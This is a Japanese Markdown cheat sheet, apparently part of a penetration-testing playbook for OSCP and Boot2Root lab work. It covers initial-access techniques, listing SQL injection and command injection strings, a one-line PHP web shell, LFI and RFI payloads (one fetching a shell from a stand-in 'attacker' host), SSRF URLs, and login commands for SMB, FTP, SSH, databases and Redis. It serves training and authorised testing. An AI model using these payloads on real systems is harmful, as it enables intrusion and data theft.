# Initial Access（初期侵入）

Initial Access は、Recon / Enumeration で得た情報をもとに  
**ターゲットへ最初の侵入を成功させるフェーズ**です。

Boot2Root テンプレートの **Initial Access 章の詳細版**として機能します。

---

# 🎯 目的

- 外部サービスの脆弱性を利用して侵入する  
- 認証情報を使ってログインする  
- WebShell / RCE / LFI / SQLi などを利用する  
- SMB / FTP / DB / Redis などから侵入する  
- OSCP レポートで必要な「侵入の根拠と再現性」を整理する  

---

# 📘 目次

1. Web 初期侵入  
2. SMB 初期侵入  
3. FTP 初期侵入  
4. SSH 初期侵入  
5. Database 初期侵入  
6. Redis 初期侵入  
7. その他の初期侵入  
8. 初期侵入後の確認  
9. Boot2Root との連携

---

# 1. Web 初期侵入

Web は最も突破口が多い。

## 1.1 SQL Injection（SQLi）
```
' OR 1=1 --
' UNION SELECT ...
```

### 確認ポイント
- ログインバイパス  
- DB ダンプ  
- 認証情報の取得  

---

## 1.2 Command Injection（RCE）
```
; id
&& whoami
```

### 確認ポイント
- OS コマンド実行  
- WebShell の設置  

---

## 1.3 File Upload（WebShell）
```
<?php system($_GET['cmd']); ?>
```

### 確認ポイント
- 拡張子制限  
- MIME チェック  
- バイパス（.php.jpg など）  

---

## 1.4 LFI / RFI
```
?page=../../../../etc/passwd
?page=http://attacker/shell.txt
```

### 確認ポイント
- ローカルファイル読み取り  
- RCE への発展  

---

## 1.5 SSRF
```
http://127.0.0.1:3306
http://localhost/admin
```

### 確認ポイント
- 内部サービスの探索  
- 認証バイパス  

---

# 2. SMB 初期侵入

```
smbclient //<TARGET>/<SHARE>
```

### 確認ポイント
- 認証情報  
- Web ソースコード  
- バックアップファイル  
- SSH鍵  

---

# 3. FTP 初期侵入

```
ftp <TARGET>
```

### 確認ポイント
- anonymous  
- 書き込み可能か  
- WebShell アップロード  

---

# 4. SSH 初期侵入

```
ssh user@<TARGET>
```

### 確認ポイント
- 弱パスワード  
- 公開鍵  
- パスワードスプレー  

---

# 5. Database 初期侵入

## 5.1 MySQL
```
mysql -h <TARGET> -u root -p
```

### 確認ポイント
- 弱パスワード  
- DB 内のユーザー情報  
- Web アプリの認証情報  

---

## 5.2 PostgreSQL
```
psql -h <TARGET> -U postgres
```

---

# 6. Redis 初期侵入

```
redis-cli -h <TARGET>
```

### 確認ポイント
- 未認証アクセス  
- SSH authorized_keys 書き込み  
- 内部サービスの情報  

---

# 7. その他の初期侵入

## 7.1 RDP
```
xfreerdp /u:user /p:pass /v:<TARGET>
```

## 7.2 VNC
```
vncviewer <TARGET>
```

## 7.3 SNMP
```
snmpwalk -v2c -c public <TARGET>
```

---

# 8. 初期侵入後の確認

初期侵入が成功したら、以下を確認する：

### ✔ whoami  
### ✔ id  
### ✔ hostname  
### ✔ pwd  
### ✔ ls -la  
### ✔ netstat / ss  
### ✔ sudo -l  

これらは Boot2Root の **Local Enumeration** に続く。

---

# 9. Boot2Root との連携

Boot2Root の Initial Access 章は軽量化されており、  
詳細はこのページにリンクされます。

Boot2Root の流れ：

```
Enumeration
↓
Initial Access
↓
Local Enumeration
```

そのため、Boot2Root では結果だけ記録し、  
技術的な深掘りは Pentest-Playbook の Initial Access に集約します。

---

# 🎯 この章の目的

- 初期侵入の技術体系を 1ページに集約  
- Boot2Root の軽量テンプレートと連携  
- OSCP レポート品質の情報整理  
- 将来の構造変更にも強い設計  
